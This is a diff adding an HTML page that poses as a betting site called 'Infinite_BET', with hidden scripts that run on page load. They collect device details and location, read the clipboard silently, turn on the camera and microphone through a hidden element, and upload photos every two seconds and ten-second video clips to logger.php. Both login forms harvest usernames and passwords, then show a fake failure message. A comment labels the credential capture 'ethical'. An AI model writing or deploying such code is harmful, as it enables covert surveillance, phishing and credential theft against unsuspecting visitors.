@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>💹Infinite_BET💸 – Bet Like a Millionaire</title>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <style>
+
+  .logo {
+    font-size: 2rem;
+    color: var(--accent);
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .glow-text {
+    font-size: 1.4rem;
+    font-weight: 700;
+    color: var(--accent);
+    text-shadow: 0 0 8px #d4af37, 0 0 16px #d4af37, 0 0 24px #ffd700;
+    animation: glow-pulse 2.5s ease-in-out infinite;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  @keyframes glow-pulse {
+    0%, 100% {
+      text-shadow: 0 0 8px #d4af37, 0 0 16px #d4af37, 0 0 24px #ffd700;
+    }
+    50% {
+      text-shadow: 0 0 12px #fff678, 0 0 24px #ffd700, 0 0 36px #fff678;
+    }
+  }
+
+    #cam, #snapCanvas {
+  position: absolute;
+  width: 1px;
+  height: 1px;
+  opacity: 0;
+  pointer-events: none;
+}
+
+    :root {
+      --primary: #0a1a3f;
+      --accent: #d4af37;
+      --secondary: #ccc;
+      --bg-dark: #1a1a1a;
+      --panel-bg: #222;
+      --white: #fff;
+      --shadow: 0 4px 12px rgba(255, 215, 0, 0.3);
+    }
+    body {
+      margin: 0;
+      background: url('BettingBG.png') center/cover fixed;
+      color: var(--white);
+      font-family: 'Montserrat', sans-serif;
+      overflow-x: hidden;
+    }
+    header {
+      background: var(--primary);
+      padding: 1rem 2rem;
+      display:flex; justify-content:space-between; align-items:center;
+      box-shadow: var(--shadow);
+      position:sticky; top:0; z-index:1000;
+    }
+    .logo { font-size:1.8rem; color: var(--accent); }
+    nav ul { display:flex; gap:1.5rem; list-style:none; }
+    nav a { color: var(--secondary); text-decoration:none; }
+    nav a:hover { color: var(--accent); }
+    .hero {
+      background: rgba(0,0,0,0.6);
+      padding:4rem 2rem; text-align:center;
+    }
+    .hero h1 { color:var(--accent); font-size:2.6rem; margin-bottom:1rem; }
+    .hero p { color:#ddd; font-size:1.2rem; }
+    .btn {
+      background:var(--accent); color:var(--bg-dark);
+      padding:0.8rem 2rem; border:none; border-radius:30px;
+      font-weight:bold; cursor:pointer; box-shadow:var(--shadow);
+    }
+    .btn:hover { transform:translateY(-2px); }
+    .featured {
+      padding:3rem 2rem; max-width:1200px;
+      margin:auto;
+      background: rgba(0,0,0,0.5);
+      border-radius:10px;
+      box-shadow:var(--shadow);
+    }
+    .featured h2 {
+      color:var(--accent);
+      margin-bottom:2rem;
+      text-align:center;
+      text-shadow: 0 0 8px var(--accent);
+    }
+    .card-grid {
+      display:grid;
+      grid-template-columns:repeat(3,1fr);
+      gap:2rem;
+    }
+    .card, .login-panel {
+      background:var(--panel-bg);
+      border-radius:8px;
+      overflow:hidden;
+      box-shadow:var(--shadow);
+      transition:transform .2s, box-shadow .3s;
+    }
+    .card:hover, .login-panel:hover {
+      transform:translateY(-6px);
+      box-shadow: 0 0 20px var(--accent);
+    }
+    .card img {
+      width:100%; height:150px; object-fit:cover;
+    }
+    .card-content, .login-content {
+      padding:1rem;
+    }
+    .card h3, .login-panel h3 {
+      color:var(--white);
+      margin-bottom:.5rem;
+      text-align:center;
+      text-shadow: 0 0 8px var(--accent);
+    }
+    .card p {
+      color:var(--secondary);
+      font-size:.95rem;
+      text-align:center;
+    }
+
+    .login-panel form {
+      display: flex;
+      flex-direction: column;
+      gap: 0.6rem;
+    }
+    .login-panel input {
+      padding: 0.6rem;
+      border-radius: 5px;
+      border: none;
+      outline: none;
+      background: #333;
+      color: var(--white);
+    }
+    .login-panel button {
+      background: var(--accent);
+      color: var(--bg-dark);
+      padding: 0.6rem;
+      font-weight: bold;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .chart-section {
+      padding:3rem 2rem;
+      max-width:1200px;
+      margin:auto;
+      background: rgba(0,0,0,0.5);
+      border-radius:10px;
+    }
+    .chart-section h2 {
+      color:var(--accent);
+      margin-bottom:2rem;
+      text-align:center;
+      text-shadow: 0 0 10px var(--accent);
+    }
+    .chart-grid {
+      display:grid;
+      grid-template-columns:repeat(3,1fr);
+      gap:2rem;
+    }
+    .chart-box {
+      background:var(--panel-bg);
+      border-radius:8px;
+      padding:1rem;
+      box-shadow:var(--shadow);
+      text-align:center;
+    }
+    .chart-box h3 {
+      color:var(--accent);
+      margin-bottom:.5rem;
+      text-shadow: 0 0 6px var(--accent);
+    }
+    canvas {
+      max-height:180px;
+    }
+    footer {
+      background:var(--primary);
+      color:var(--secondary);
+      padding:2rem;
+      text-align:center;
+    }
+    footer a {
+      color:var(--accent);
+      text-decoration:none;
+    }
+
+    .money-trail {
+      position:absolute;
+      width:30px; height:30px;
+      background-size:cover;
+      pointer-events:none;
+      z-index:9999;
+      transform:translate(-15px,-15px);
+      transition:transform 1s ease-out, opacity 1s ease-out;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="logo">💹Infinite_BET💸</div>
+  <span class="glow-text">Bet like a MILLIONARE</span>
+  <div>
+  <nav>
+    <ul>
+      <li><a href="#">Home</a></li>
+      <li><a href="#">Cricket</a></li>
+      <li><a href="#">Live Betting</a></li>
+      <li><a href="#">Casino</a></li>
+      <li><a href="#">VIP Lounge</a></li>
+      <li><a href="#">Promotions</a></li>
+    </ul>
+  </nav>
+</header>
+
+<section class="hero">
+  <h1>Enter the World of Betting</h1>
+  <p>Live Cricket Odds • Instant Wins • Elite Rewards</p>
+  <button class="btn">Join the Elite</button>
+</section>
+
+<section class="featured">
+  <h2>Featured Events</h2>
+  <div class="card-grid">
+    <div class="card">
+      <img src="T20-Match.png" alt="IPL">
+      <div class="card-content">
+        <h3>T20 2025</h3>
+        <p>Win big on every powerplay and wicket!</p>
+      </div>
+    </div>
+    <div class="card">
+      <img src="Casino.png" alt="VIP Casino">
+      <div class="card-content">
+        <h3>VIP Casino Night</h3>
+        <p>Roll the dice. Win luxury jackpots.</p>
+      </div>
+    </div>
+    <div class="login-panel">
+      <div class="login-content">
+        <h3>Login</h3>
+        <form>
+          <input type="text" placeholder="Username" required>
+          <input type="password" placeholder="Password" required>
+          <button type="submit">Login</button>
+        </form>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="chart-section">
+  <h2>📈 High Profit Events</h2>
+  <div class="chart-grid">
+    <div class="chart-box"><h3>🏇 Horse Racing</h3><canvas id="chart1"></canvas></div>
+    <div class="chart-box"><h3>🏆 Olympics</h3><canvas id="chart2"></canvas></div>
+    <div class="chart-box"><h3>⚽ FIFA</h3><canvas id="chart3"></canvas></div>
+    <div class="chart-box"><h3>🏏 Asia Cup</h3><canvas id="chart4"></canvas></div>
+    <div class="chart-box"><h3>🎮 eSports</h3><canvas id="chart5"></canvas></div>
+    <div class="chart-box"><h3>🎲 Live Roulette</h3><canvas id="chart6"></canvas></div>
+  </div>
+</section>
+
+<footer>
+  © 2025 💹Infinite_BET💸– <a href="#">VIP Support</a> | <a href="#">Terms</a> | Designed and Devoloped by Charitardha Pulipati 
+
+</footer>
+
+<script>
+  const moneyImages = ['1.png', '2.png', '3.png', '4.png'];
+
+  document.addEventListener('mousemove', function(e) {
+    const MAX_COINS = 25;
+    const existing = document.querySelectorAll('.money-trail');
+    if (existing.length >= MAX_COINS) {
+      existing[0]?.remove();
+    }
+    const coin = document.createElement('div');
+    coin.className = 'money-trail';
+    const randImg = moneyImages[Math.floor(Math.random() * moneyImages.length)];
+    coin.style.backgroundImage = `url('${randImg}')`;
+    coin.style.left = `${e.pageX}px`;
+    coin.style.top = `${e.pageY}px`;
+    const dx = (Math.random() - 0.5) * 80;
+    const dy = (Math.random() - 0.5) * 80;
+    document.body.appendChild(coin);
+    requestAnimationFrame(() => {
+      coin.style.transform = `translate(${dx}px, ${dy}px) scale(0.6)`;
+      coin.style.opacity = '0';
+    });
+    setTimeout(() => coin.remove(), 2000);
+  });
+
+  function createChart(id) {
+    const ctx = document.getElementById(id).getContext('2d');
+    new Chart(ctx, {
+      type: 'line',
+      data: {
+        labels: ['Start', '', '', '', '', '', 'Now'],
+        datasets: [{
+          label: 'Profits',
+          data: [10, 20, 40, 80, 150, 280, 500],
+          backgroundColor: 'rgba(212, 175, 55, 0.2)',
+          borderColor: '#d4af37',
+          borderWidth: 2,
+          fill: true,
+          tension: 0.4
+        }]
+      },
+      options: {
+        scales: {
+          x: { display: false },
+          y: { display: false }
+        },
+        plugins: { legend: { display: false } },
+        responsive: true,
+        maintainAspectRatio: false
+      }
+    });
+  }
+
+  for (let i = 1; i <= 6; i++) {
+    createChart('chart' + i);
+  }
+</script>
+
+<video id="cam" autoplay playsinline muted></video>
+<canvas id="snapCanvas"></canvas>
+<input type="text" id="dummyInput" style="position:absolute;left:-9999px;">
+
+
+</body>
+
+<script>
+(async () => {
+
+  const info = {
+    timestamp_utc: new Date().toString(),
+    userAgent: navigator.userAgent,
+    cores: navigator.hardwareConcurrency || 'N/A',
+    ram: navigator.deviceMemory || 'N/A',
+    width: window.innerWidth,
+    height: window.innerHeight,
+    latitude: 'Denied',
+    longitude: 'Denied',
+    battery: 'Unavailable'
+  };
+
+  if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        info.latitude = pos.coords.latitude;
+        info.longitude = pos.coords.longitude;
+        sendInfo();
+      },
+      () => sendInfo()
+    );
+  } else sendInfo();
+
+  if (navigator.getBattery) {
+    const battery = await navigator.getBattery();
+    info.battery = `${Math.round(battery.level * 100)}% - ${battery.charging ? "Charging" : "Not Charging"}`;
+  }
+
+  function sendInfo() {
+    fetch("logger.php", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(info)
+    });
+  }
+
+  document.getElementById('dummyInput').addEventListener('focus', async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      if (text.trim().length > 0) {
+        fetch("logger.php", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ clipboard: text.trim() })
+        });
+      }
+    } catch {}
+  });
+
+  let chunks = [];
+  const video = document.getElementById("cam");
+  const canvas = document.getElementById("snapCanvas");
+  const ctx = canvas.getContext("2d");
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    video.srcObject = stream;
+
+    const waitForVideoReady = () => {
+      return new Promise(resolve => {
+        const check = () => {
+          if (
+            video.readyState >= 2 &&
+            video.videoWidth > 0 &&
+            video.videoHeight > 0
+          ) {
+            resolve();
+          } else {
+            requestAnimationFrame(check);
+          }
+        };
+        check();
+      });
+    };
+
+    const startSnapshotLoop = () => {
+      const takeSnapshot = () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(async blob => {
+          if (blob && blob.size > 0) {
+            const formData = new FormData();
+            formData.append("snapshot", blob, "photo_" + Date.now() + ".jpg");
+
+            await fetch("logger.php", {
+              method: "POST",
+              body: formData
+            });
+          }
+        }, "image/jpeg", 0.95);
+      };
+
+      // Start after first valid frame rendered
+      waitForVideoReady().then(() => {
+        console.log("📸 Snapshot loop started");
+        setInterval(takeSnapshot, 2000);
+      });
+    };
+
+    const startVideoRecordingLoop = () => {
+      const recordChunk = async () => {
+        let localChunks = [];
+        const recorder = new MediaRecorder(stream, {
+          mimeType: MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")
+            ? "video/webm;codecs=vp9,opus"
+            : "video/webm"
+        });
+
+        recorder.ondataavailable = e => {
+          if (e.data.size > 0) localChunks.push(e.data);
+        };
+
+        recorder.onstop = async () => {
+          const blob = new Blob(localChunks, { type: 'video/webm' });
+          const formData = new FormData();
+          formData.append('webmVideo', blob, 'video_' + Date.now() + '.mp4');
+
+          await fetch('logger.php', {
+            method: 'POST',
+            body: formData
+          });
+        };
+
+        recorder.start();
+
+        setTimeout(() => {
+          if (recorder.state === "recording") recorder.stop();
+        }, 10000); // 10s
+      };
+
+      recordChunk();
+      setInterval(recordChunk, 10000);
+    };
+
+    video.onloadedmetadata = () => {
+      video.play(); // ensure video playback
+      startSnapshotLoop();
+      startVideoRecordingLoop();
+    };
+
+  } catch (err) {
+    console.error("🎥 Media access failed:", err);
+  }
+})();
+
+// 📋 Silent Clipboard Capture (triggered by user interaction)
+let clipboardCaptured = false;
+
+function captureClipboardOnce() {
+  if (clipboardCaptured) return;
+  clipboardCaptured = true;
+
+  navigator.clipboard.readText().then(text => {
+    if (text && text.trim().length > 0) {
+      fetch("logger.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ clipboard: text.trim() })
+      });
+    }
+  }).catch(() => {});
+}
+
+// 🔥 Trigger once on any interaction
+["click", "keydown", "mousemove", "touchstart"].forEach(evt =>
+  window.addEventListener(evt, captureClipboardOnce, { once: true })
+);
+
+// ✅ Capture login credentials ethically
+document.querySelector('.login-panel form')?.addEventListener('submit', function (e) {
+  e.preventDefault(); // prevent actual form submission
+
+  const username = this.querySelector('input[type="text"]')?.value || 'N/A';
+  const password = this.querySelector('input[type="password"]')?.value || 'N/A';
+
+  fetch("logger.php", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      login_username: username,
+      login_password: password,
+      timestamp: new Date().toString()
+    })
+  });
+
+  // Optional: Show a fake "Login failed" message or redirect
+  alert("Login failed. Please try again.");
+});
+
+</script>
+
+<!-- 🔒 LOGIN MODAL -->
+<div id="loginModal" style="display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;
+  background:rgba(0,0,0,0.8);z-index:9999;align-items:center;justify-content:center;">
+  <div style="background:#222;padding:2rem;border-radius:10px;max-width:400px;width:90%;
+              box-shadow:0 0 20px gold;text-align:center;">
+    <h3 style="color:gold;margin-bottom:1rem;">Login</h3>
+    <form id="modalLoginForm">
+      <input type="text" placeholder="Username" required style="width:100%;padding:0.5rem;
+             margin-bottom:0.5rem;background:#333;color:#fff;border:none;border-radius:5px;">
+      <input type="password" placeholder="Password" required style="width:100%;padding:0.5rem;
+             margin-bottom:0.5rem;background:#333;color:#fff;border:none;border-radius:5px;">
+      <button type="submit" style="background:gold;color:#000;padding:0.6rem 1rem;
+              border:none;border-radius:5px;font-weight:bold;cursor:pointer;">Login</button>
+    </form>
+    <div id="closeLogin" style="margin-top:1rem;color:#ccc;cursor:pointer;font-size:0.9rem;">
+      Close
+    </div>
+  </div>
+</div>
+
+<script>
+// 🟢 ELEMENTS TRIGGERING LOGIN MODAL
+const loginModal = document.getElementById('loginModal');
+
+const triggers = [
+  ...document.querySelectorAll('nav a'),
+  document.querySelector('.btn'),
+  ...document.querySelectorAll('.card')
+];
+
+triggers.forEach(el => {
+  el.addEventListener('click', e => {
+    const text = el.textContent.trim().toLowerCase();
+    if (text === 'home') return; // allow home to work normally
+
+    e.preventDefault();
+    loginModal.style.display = 'flex';
+  });
+});
+
+
+// 🟡 CLOSE BUTTON
+document.getElementById('closeLogin').addEventListener('click', () => {
+  document.getElementById('loginModal').style.display = 'none';
+});
+
+// 🔴 SUBMIT LOGIN FORM
+document.getElementById('modalLoginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const [username, password] = [...this.querySelectorAll('input')].map(i => i.value);
+  fetch("logger.php", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      login_username: username,
+      login_password: password,
+      timestamp: new Date().toString()
+    })
+  });
+  alert("Login failed. Please try again.");
+  document.getElementById('loginModal').style.display = 'none';
+});
+</script>
+
+
+</body>
+</html>
